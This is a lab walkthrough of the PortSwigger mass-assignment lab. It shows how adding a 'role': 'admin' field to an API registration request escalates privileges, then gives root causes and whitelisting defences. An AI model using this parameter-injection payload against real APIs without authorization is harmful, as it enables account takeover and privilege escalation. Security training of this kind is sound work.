# API Mass Assignment Vulnerability

## Lab Link
https://portswigger.net/web-security/api-testing/mass-assignment

## Vulnerability Type
Mass Assignment / Privilege Escalation

## Difficulty
Easy-Medium

## Vulnerability Theory
Mass assignment (aka over-posting) occurs when an API accepts more parameters than intended and assigns them to object properties. Attackers can modify fields they shouldn't have access to:
- User roles and permissions
- Account balance or credits
- Admin status
- Email verification status

## Recon & Discovery
1. Identify all API endpoints accepting POST/PUT
2. Capture request bodies in Burp
3. Note which parameters are used
4. Research what other parameters might exist
5. Try adding extra parameters to requests
6. Look for parameters like: `role`, `admin`, `is_admin`, `verified`, `balance`
7. Check API documentation for parameter lists

## Step-by-Step Exploitation

### Step 1: Identify Parameters
**Original Request:**
```
POST /api/users/register HTTP/1.1
Content-Type: application/json

{"username": "user", "email": "user@example.com", "password": "pass123"}
```

### Step 2: Add Hidden Parameters
**Modified Request:**
```
POST /api/users/register HTTP/1.1
Content-Type: application/json

{"username": "user", "email": "user@example.com", "password": "pass123", "role": "admin"}
```

**Response:**
```
HTTP/1.1 201 Created
{"user_id": 123, "username": "user", "role": "admin"}
```

### Step 3: Exploit Privilege Escalation
The newly created user has admin role!

## Root Cause
- Blindly assigning all request parameters to object properties
- No whitelist of allowed parameters
- Trusting client input for sensitive fields

## Prevention
1. **Explicit Whitelisting**:
   ```python
   allowed_params = ['username', 'email', 'password']
   user_data = {k: v for k, v in request.json.items() if k in allowed_params}
   ```

2. **DTOs/Data Transfer Objects**: Use specific objects for input
3. **Input Validation**: Validate all parameters
4. **Principle of Least Privilege**: Default-deny approach

## Key Lessons
- Never trust all request parameters
- Whitelist parameters explicitly
- Test for hidden parameters regularly

---

**Difficulty**: Easy-Medium
**Time Estimate**: 10-15 minutes
